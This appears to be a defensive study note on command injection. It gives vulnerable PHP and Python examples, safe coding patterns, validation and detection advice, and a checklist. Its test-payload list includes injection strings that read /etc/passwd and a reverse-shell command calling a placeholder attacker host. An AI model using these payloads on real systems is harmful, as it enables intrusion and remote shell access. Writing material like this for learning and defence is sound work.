# Command Injection Notes

**What it is**  
Command injection occurs when an application builds and executes OS/shell commands using untrusted input, allowing an attacker to run arbitrary commands on the host.

---

## Key Indicators
- App calls shell functions: `system`, `exec`, `shell_exec`, backticks, `popen`, `os.system`, `Runtime.exec`, `child_process.exec`, etc.  
- Features that call OS tools (ping, convert, ffmpeg, imagemagick, zip, etc.).  
- Input directly concatenated into command strings.

---

## Impact
- Remote code execution (RCE) as the service user.  
- Data theft, privilege escalation, persistence, lateral movement, pivoting.

---

## Example (Vulnerable)
```php
// PHP (vulnerable)
$ip = $_GET['ip'];
$output = shell_exec("ping -c 1 " . $ip);
```

```python
# Python (vulnerable)
os.system("ping -c 1 " + host)
```

---

## Quick Safe Patterns
- **Avoid shell**: use native libraries (network, file, image libs).  
- **Use argument arrays** (no shell parsing):
  - Python: `subprocess.run(['ping','-c','1', host])` (no `shell=True`)  
  - Node: `spawn('ls', ['-l', path])`  
- **Whitelist input** (best): only allow strict formats (e.g., IPv4 regex).  
- **Run least privilege**, sandbox, containerize, monitor.

---

## Input Validation Rules
- Prefer **whitelist** over blacklist.  
- If validating strings: require strict patterns (IP, filename pattern).  
- If unavoidable, use proper escaping and argument arrays — escaping is fragile.

---

## Test Payloads (AUTHORIZED TESTING ONLY)
- `; whoami`
- `&& id`
- `| cat /etc/passwd`
- `` `id` ``
- Blind/time-based: `; sleep 10` (detect delay)
- Danger: reverse shell `; bash -i >& /dev/tcp/ATTACKER/4444 0>&1` (lab-only)

---

## Detection / Logging
- Unexpected command args in logs.  
- Outbound connections from web process.  
- Long response times (time-based payloads).  
- New shells/processes spawned by web user.

---

## Short Checklist
- [ ] Remove/replace shell calls with native APIs.  
- [ ] Use argument arrays (no shell=True).  
- [ ] Implement strict whitelists for inputs.  
- [ ] Run services with minimal privileges.  
- [ ] Log command execution and alert on anomalies.  
- [ ] Add CI SAST scans and runtime monitoring.

---

## References / Further Reading
- OWASP Command Injection Cheat Sheet  
- Language docs: Python `subprocess`, Node `child_process`, PHP process functions
